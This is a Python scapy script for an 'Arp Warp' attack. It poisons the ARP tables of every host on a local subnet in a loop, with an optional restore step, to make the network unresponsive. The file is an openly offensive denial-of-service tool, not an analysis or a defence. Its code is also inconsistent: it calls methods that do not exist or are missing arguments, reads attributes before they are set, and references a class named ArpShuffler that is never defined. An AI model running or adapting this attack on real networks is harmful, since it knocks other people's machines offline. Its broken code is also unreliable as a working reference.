import threading
import time

from scapy.all import *

#   --------------------------------------------------------------------------------------------------------------------
#
#   Arp Warp attack - Continously poison the ARP table of all hosts on the connected table, and thus make it unresponsive
#
#   Notes
#       * 
#
#   Mitigation
#       * Static ARP table
#
#   --------------------------------------------------------------------------------------------------------------------


class ArpWarp:
    def __init__(self, cycle_len, do_restore, iface):
        self.cycle_length = int(cycle_len)
        self.do_restore = int(do_restore)
        self.network_interface = iface

        self.my_mac = Ether().src
        self.my_private_ip = get_if_addr(self.network_interface)  # default interface

        self.arp_poison_sleep = 1

        self.subnet = self.my_private_ip.split(".")[:3]
        self.subnet_range = range(0, 256)

        self.original_arp_table = self.gather_original_table()
        self.scrambled_arp_table = self.generate_poisoned_arp_table()

        self.finished = False

    def gather_original_table(self, tested_ip):
        arp_packet = ARP(op=1, psrc=self.my_private_ip, hwsrc=self.my_mac, pdst=tested_ip)
        arp_res = srp1(Ether() / arp_packet, timeout=2, iface=self.network_interface)
        if arp_res:
            print(f"[+] HOST IS UP {tested_ip} -> {arp_res[ARP].hwsrc}")
            self.original_arp_table[tested_ip] = arp_res[ARP].hwsrc

    def run_scanner(self):
        print(f"[*] Running scanner for subnet {'.'.join(self.subnet)}.x")
        temp_threads_list = list()

        for host_part in self.subnet_range:
            ip = ".".join(self.subnet + [str(host_part)])
            if ip != self.my_private_ip:
                t = threading.Thread(target=self.send_arp_packet, args=(ip,))
                temp_threads_list.append(t)
                t.start()

        print(f"[*] Sent all packets, waiting for responses...")
        for t in temp_threads_list:
            t.join()
        print(f"[*] Finished scanning")

    def generate_poisoned_arp_table(self):
        """
        Make a new poisoned table where each key has the value of the preceeding key
        """
        poisoned_table = dict()
        table_size = len(self.original_arp_table)
        spoofed_values = [list(self.original_arp_table.values())[i - 1] for i in range(table_size)]

        print(f"[*] Preparing poisoned table...")
        for index, host_ip in enumerate(self.original_arp_table.keys()):
            poisoned_table[host_ip] = spoofed_values[index]
            print(f"[*] Host {host_ip}\toriginal {self.original_arp_table[host_ip]}"
                  f"\t spoofed {self.scrambled_arp_table[host_ip]}")

        print(f"[*] Poisoned table is ready")
        return poisoned_table

    def poison_arp(self):
        """
        iterate over all spoofed entries, and send each host (inside an inner loop) the
        arp packets of the scrambled entries
        """
        for poison_host_ip, poison_host_mac in self.scrambled_arp_table.items():
            print(f"[*] Poisoning for {poison_host_ip}...")

            for target_host_ip, target_host_mac in self.original_arp_table.items():
                if target_host_ip != poison_host_ip:
                    arp_packet = ARP(op=2,
                                     psrc=poison_host_ip,
                                     hwsrc=poison_host_mac,
                                     pdst=target_host_ip,
                                     hwdst=target_host_mac)
                    sendp(Ether() / arp_packet, iface=self.network_interface)

    def restore_arp(self):
        """
        restore the arp table to the original values for all network hosts
        """
        for restore_host_ip, restore_host_mac in self.original_arp_table.items():
            print(f"[*] Restoring for {restore_host_ip}...")

            for target_host_ip, target_host_mac in self.original_arp_table.items():
                if target_host_ip != restore_host_ip:
                    arp_packet = ARP(op=2,
                                     psrc=restore_host_ip,
                                     hwsrc=restore_host_mac,
                                     pdst=target_host_ip,
                                     hwdst=target_host_mac)
                    sendp(Ether() / arp_packet, iface=self.network_interface)

    def do_attack(self):
        try:
            loop_count = 0
            while loop_count < self.cycle_length:
                loop_count += 1
                self.poison_arp()
                print(f"[*] Finished attack loop {loop_count} out of {self.cycle_length}")
                time.sleep(self.arp_poison_sleep)
        except Exception as exc:
            print(f"[!] Exception caught: {exc}")
        finally:
            if self.do_restore:
                print("[*] Restoring arp...")
                self.restore_arp()


if __name__ == "__main__":
    conf.verb = 0

    cycle_length = sys.argv[1]
    restore_after_cycle = sys.argv[2]
    network_interface = sys.argv[3]
    while True:
        print(f"[*] Setting up a new attacker...")
        shuffler = ArpShuffler(cycle_length, restore_after_cycle, network_interface)
        shuffler.do_attack()
